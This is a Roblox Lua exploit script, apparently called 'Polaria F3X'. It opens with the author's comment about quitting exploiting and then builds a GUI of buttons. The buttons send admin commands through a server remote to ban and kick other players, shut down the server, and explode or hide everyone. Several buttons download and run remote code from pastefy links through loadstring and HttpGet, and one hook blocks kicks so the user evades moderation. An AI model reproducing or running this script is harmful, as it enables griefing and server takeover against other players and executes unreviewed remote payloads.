--[ Polaria F3X by anonymoos11i11i1 V.7 Last version (I'm quiting this f3x exploits shit bro) ]--


--[ if you deobfuscate and see this message I want to say that scripting is never a easy thing for me I try to learn Lua learn to understand stuffs my self I can make a gui I can make a SYNCAPI script but it's all over nothing is left I tried several several times but the winner get to write history and not the loser this community is full of doxing and cyber crimes I can't believe this collapsing kids game can have this dark truth ai is a tool that created hundreds of skids on scriptblox and now people can't even identify what's ai and what's not I am very disappointed you act tuff while you can't do shit ]--


--[ Make sure your device is not a potato to run the maps properly ]--

--[ Printing (Very useless)]--
rain.TextSize = 18.000
rain.TextWrapped = true
rain.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/Y268tPI3/raw"))()
end)

lego.Name = "lego"
lego.Parent = serverpage
lego.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
lego.BorderColor3 = Color3.fromRGB(129, 26, 255)
lego.BorderSizePixel = 2
lego.Position = UDim2.new(0.752735257, 0, 0.285714298, 0)
lego.Size = UDim2.new(0, 99, 0, 29)
lego.Font = Enum.Font.Arial
lego.Text = "Bricks"
lego.TextColor3 = Color3.fromRGB(255, 255, 255)
lego.TextSize = 18.000
lego.TextWrapped = true
lego.MouseButton1Click:Connect(function()
rq:InvokeServer(";insert 65523893")
wait(0.1)
rq:InvokeServer(";insert 65524063")
wait(0.1)
rq:InvokeServer(";insert 65523935")
wait(0.1)
rq:InvokeServer(";insert 65523983")
wait(1)
rq:InvokeServer(";insert 65523893")
wait(0.1)
rq:InvokeServer(";insert 65524063")
wait(0.1)
rq:InvokeServer(";insert 65523935")
wait(0.1)
rq:InvokeServer(";insert 65523983")
end)

r6.Name = "r6"
r6.Parent = serverpage
r6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
r6.BorderColor3 = Color3.fromRGB(129, 26, 255)
r6.BorderSizePixel = 2
r6.Position = UDim2.new(0.512035012, 0, 0.285714298, 0)
r6.Size = UDim2.new(0, 104, 0, 29)
r6.Font = Enum.Font.Arial
r6.Text = "R6"
r6.TextColor3 = Color3.fromRGB(255, 255, 255)
r6.TextSize = 18.000
r6.TextWrapped = true
r6.MouseButton1Click:Connect(function()
rq:InvokeServer(";r6")
end)

workspace.Name = "workspace"
workspace.Parent = serverpage
workspace.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
workspace.BorderColor3 = Color3.fromRGB(129, 26, 255)
workspace.BorderSizePixel = 2
workspace.Position = UDim2.new(0.271334797, 0, 0.285714298, 0)
workspace.Size = UDim2.new(0, 104, 0, 29)
workspace.Font = Enum.Font.Arial
workspace.Text = "Clear Workspace"
workspace.TextColor3 = Color3.fromRGB(255, 255, 255)
workspace.TextSize = 12.000
workspace.TextWrapped = true
workspace.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/psSFNsX2/raw"))()
end)

_63x.Name = "6 3x"
_63x.Parent = serverpage
_63x.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_63x.BorderColor3 = Color3.fromRGB(129, 26, 255)
_63x.BorderSizePixel = 2
_63x.Position = UDim2.new(0.0306345727, 0, 0.285714298, 0)
_63x.Size = UDim2.new(0, 104, 0, 29)
_63x.Font = Enum.Font.Arial
_63x.Text = "666"
_63x.TextColor3 = Color3.fromRGB(255, 255, 255)
_63x.TextSize = 18.000
_63x.TextWrapped = true
_63x.MouseButton1Click:Connect(function()
rq:InvokeServer(";titler all 666 666 666 666")
loadstring(game:HttpGet("https://pastefy.app/8D0KpDjn/raw"))()
end)

tornado.Name = "tornado"
tornado.Parent = serverpage
tornado.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
tornado.BorderColor3 = Color3.fromRGB(129, 26, 255)
tornado.BorderSizePixel = 2
tornado.Position = UDim2.new(0.752735257, 0, 0.414285719, 0)
tornado.Size = UDim2.new(0, 99, 0, 29)
tornado.Font = Enum.Font.Arial
tornado.Text = "Tornado"
tornado.TextColor3 = Color3.fromRGB(255, 255, 255)
tornado.TextSize = 18.000
tornado.TextWrapped = true
tornado.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/KzS5FG2N/raw"))()
end)

shutdown.Name = "shutdown"
shutdown.Parent = serverpage
shutdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shutdown.BorderColor3 = Color3.fromRGB(129, 26, 255)
shutdown.BorderSizePixel = 2
shutdown.Position = UDim2.new(0.512035012, 0, 0.414285719, 0)
shutdown.Size = UDim2.new(0, 104, 0, 29)
shutdown.Font = Enum.Font.Arial
shutdown.Text = "Shutdown"
shutdown.TextColor3 = Color3.fromRGB(255, 255, 255)
shutdown.TextSize = 18.000
shutdown.TextWrapped = true
shutdown.MouseButton1Click:Connect(function()
rq:InvokeServer(";shutdown")
end)

nokick.Name = "no kick"
nokick.Parent = serverpage
nokick.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nokick.BorderColor3 = Color3.fromRGB(129, 26, 255)
nokick.BorderSizePixel = 2
nokick.Position = UDim2.new(0.271334797, 0, 0.414285719, 0)
nokick.Size = UDim2.new(0, 104, 0, 29)
nokick.Font = Enum.Font.Arial
nokick.Text = "Anti Kick"
nokick.TextColor3 = Color3.fromRGB(255, 255, 255)
nokick.TextSize = 18.000
nokick.TextWrapped = true
nokick.MouseButton1Click:Connect(function()
local old
old = hookmetamethod(
    game,
    "__namecall",
    function(self, ...)
        local method = tostring(getnamecallmethod())
        if string.lower(method) == "kick" then
            return wait(9e9)
        end
        return old(self, ...)
    end)
end)

song.Name = "song"
song.Parent = serverpage
song.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
song.BorderColor3 = Color3.fromRGB(129, 26, 255)
song.BorderSizePixel = 2
song.Position = UDim2.new(0.271334797, 0, 0.414285719, 0)
song.Size = UDim2.new(0, 104, 0, 29)
song.Font = Enum.Font.Arial
song.Text = "Play theme"
song.TextColor3 = Color3.fromRGB(255, 255, 255)
song.TextSize = 18.000
song.TextWrapped = true

destroy.Name = "destroy"
destroy.Parent = serverpage
destroy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
destroy.BorderColor3 = Color3.fromRGB(129, 26, 255)
destroy.BorderSizePixel = 2
destroy.Position = UDim2.new(0.0306345727, 0, 0.539285719, 0)
destroy.Size = UDim2.new(0, 104, 0, 29)
destroy.Font = Enum.Font.Arial
destroy.Text = "Destruction"
destroy.TextColor3 = Color3.fromRGB(255, 255, 255)
destroy.TextSize = 18.000
destroy.TextWrapped = true
destroy.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/psSFNsX2/raw"))()
end)

ban.Name = "ban"
ban.Parent = serverpage
ban.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ban.BorderColor3 = Color3.fromRGB(129, 26, 255)
ban.BorderSizePixel = 2
ban.Position = UDim2.new(0.0306345727, 0, 0.414285719, 0)
ban.Size = UDim2.new(0, 104, 0, 29)
ban.Font = Enum.Font.Arial
ban.Text = "Ban others"
ban.TextColor3 = Color3.fromRGB(255, 255, 255)
ban.TextSize = 18.000
ban.TextWrapped = true
ban.MouseButton1Click:Connect(function()
rq:InvokeServer(";kick others You have been banned from this server.")
rq:InvokeServer(";ban others")
end)

flood.Name = "flood"
flood.Parent = serverpage
flood.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
flood.BorderColor3 = Color3.fromRGB(129, 26, 255)
flood.BorderSizePixel = 2
flood.Position = UDim2.new(0.271334797, 0, 0.539285719, 0)
flood.Size = UDim2.new(0, 104, 0, 29)
flood.Font = Enum.Font.Arial
flood.Text = "Flood"
flood.TextColor3 = Color3.fromRGB(255, 255, 255)
flood.TextSize = 18.000
flood.TextWrapped = true
flood.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/FJTKrCdo/raw"))()
end)

explode.Name = "explode"
explode.Parent = serverpage
explode.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
explode.BorderColor3 = Color3.fromRGB(129, 26, 255)
explode.BorderSizePixel = 2
explode.Position = UDim2.new(0.512035012, 0, 0.539285719, 0)
explode.Size = UDim2.new(0, 104, 0, 29)
explode.Font = Enum.Font.Arial
explode.Text = "Explode All"
explode.TextColor3 = Color3.fromRGB(255, 255, 255)
explode.TextSize = 18.000
explode.TextWrapped = true
explode.MouseButton1Click:Connect(function()
rq:InvokeServer(";explode all")
end)

fog.Name = "fog"
fog.Parent = serverpage
fog.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fog.BorderColor3 = Color3.fromRGB(129, 26, 255)
fog.BorderSizePixel = 2
fog.Position = UDim2.new(0.752735257, 0, 0.539285719, 0)
fog.Size = UDim2.new(0, 99, 0, 29)
fog.Font = Enum.Font.Arial
fog.Text = "Nightmare"
fog.TextColor3 = Color3.fromRGB(255, 255, 255)
fog.TextSize = 18.000
fog.TextWrapped = true
fog.MouseButton1Click:Connect(function()
rq:InvokeServer(";fogcolor black ;fog 100 100")
end)

heli.Name = "heli"
heli.Parent = serverpage
heli.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
heli.BorderColor3 = Color3.fromRGB(129, 26, 255)
heli.BorderSizePixel = 2
heli.Position = UDim2.new(0.0306345727, 0, 0.664285719, 0)
heli.Size = UDim2.new(0, 104, 0, 29)
heli.Font = Enum.Font.Arial
heli.Text = "Helicopter"
heli.TextColor3 = Color3.fromRGB(255, 255, 255)
heli.TextScaled = true
heli.TextSize = 18.000
heli.TextWrapped = true
heli.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/64nPHa0K/raw"))()
end)

invis.Name = "invis"
invis.Parent = serverpage
invis.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
invis.BorderColor3 = Color3.fromRGB(129, 26, 255)
invis.BorderSizePixel = 2
invis.Position = UDim2.new(0.271334797, 0, 0.664285719, 0)
invis.Size = UDim2.new(0, 104, 0, 29)
invis.Font = Enum.Font.Arial
invis.Text = "Invisible All"
invis.TextColor3 = Color3.fromRGB(255, 255, 255)
invis.TextSize = 18.000
invis.TextWrapped = true
invis.MouseButton1Click:Connect(function()
rq:InvokeServer(";invisible all")
end)

smok.Name = "smok"
smok.Parent = serverpage
smok.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
smok.BorderColor3 = Color3.fromRGB(129, 26, 255)
smok.BorderSizePixel = 2
smok.Position = UDim2.new(0.512035012, 0, 0.664285719, 0)
smok.Size = UDim2.new(0, 104, 0, 29)
smok.Font = Enum.Font.Arial
smok.Text = "Smoke All"
smok.TextColor3 = Color3.fromRGB(255, 255, 255)
smok.TextSize = 18.000
smok.TextWrapped = true
smok.MouseButton1Click:Connect(function()
rq:InvokeServer(";smoke all")
end)

pe.Name = "pe"
pe.Parent = serverpage
pe.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
pe.BorderColor3 = Color3.fromRGB(129, 26, 255)
pe.BorderSizePixel = 2
pe.Position = UDim2.new(0.752735257, 0, 0.664285719, 0)
pe.Size = UDim2.new(0, 99, 0, 29)
